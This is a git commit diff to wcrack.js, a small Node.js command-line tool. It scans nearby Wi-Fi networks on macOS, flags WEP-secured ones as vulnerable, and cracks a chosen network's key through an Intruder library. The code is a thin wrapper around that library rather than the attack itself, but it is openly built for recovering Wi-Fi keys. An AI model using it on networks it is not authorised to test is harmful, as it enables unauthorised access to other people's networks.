fa8ca09404071877b68a582e5166a106a8309bd5
Lumir Mrkva <lumir.mrkva@topmonks.com>
2015-09-28 15:46:05 +0200

    fixed vulnerability check

--- wcrack.js
+++ wcrack.js
@@ -4,45 +4,47 @@ var argv = require('minimist')(process.argv.slice(2));
 
 var AIRPORT = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/A/Resources/airport';
 
-module.exports = {
-  cli: function() {
-    if (argv._.length < 1) {
-      this.findNetworks();
-    } else {
-      this.crack(argv._[0]);
-    }
-  },
-  findNetworks: function() {
-    console.log("Searching for vulnerable networks ...");
-    exec(AIRPORT + ' -s', function(err, out) {
-      if (err) return console.error(err);
-
-      var networks = parseNetworks(out);
-      var vulnerable = networks.filter(function (net) {
-        return net.security.indexOf('TKIP') > -1;
-      })
-      if (vulnerable.length > 0) {
-        var text = vulnerable.map(function (net) {
-          return net.ssid + '('+ net.rssi +')';
-        }).join(', ');
-        console.log('Found '+vulnerable.length+' vulnerable from '+networks.length+' networks: '+text);
-      } else {
-        console.log('No vulnerable networks found, there are '+networks.length+' networks nearby.');
-      }
-    })
-  },
-  crack: function(ssid) {
-    console.log('Cracking ' + ssid + ' ...');
-    Intruder()
-      .on('attempt', function(ivs) {
-        console.log(ivs);
-      })
-      .crack(ssid, function(err, key) {
-        if (err) return console.error(err);
-        console.log(key);
-      });
+module.exports = function() {
+  if (argv._.length < 1) {
+    findNetworks();
+  } else {
+    crack(argv._[0]);
   }
 };
+
+function findNetworks() {
+  console.log("Searching for vulnerable networks ...");
+  exec(AIRPORT + ' -s', function(err, out) {
+    if (err) return console.error(err);
+
+    var networks = parseNetworks(out);
+    var vulnerable = networks.filter(isVulnerable);
+    if (vulnerable.length > 0) {
+      var text = vulnerable.map(function (net) {
+        return net.ssid + '('+ net.rssi +')';
+      }).join(', ');
+      console.log('Found '+vulnerable.length+' vulnerable from '+networks.length+' networks: '+text);
+    } else {
+      console.log('No vulnerable networks found. There are '+networks.length+' networks nearby.');
+    }
+  })
+};
+
+function crack(ssid) {
+  console.log('Cracking ' + ssid + ' ...');
+  Intruder()
+    .on('attempt', function(ivs) {
+      console.log(ivs);
+    })
+    .crack(ssid, function(err, key) {
+      if (err) return console.error(err);
+      console.log(key);
+    });
+};
+
+function isVulnerable(net) {
+  return net.security.indexOf('WEP') > -1;
+}
 
 function parseNetworks(out) {
   var networks = out.split('\n');
@@ -54,4 +56,4 @@ function parseNetworks(out) {
   }).sort(function(a, b) {
     return (a.rssi > b.rssi) ? 1 : ((b.rssi > a.rssi) ? -1 : 0);
   })
-}
+};
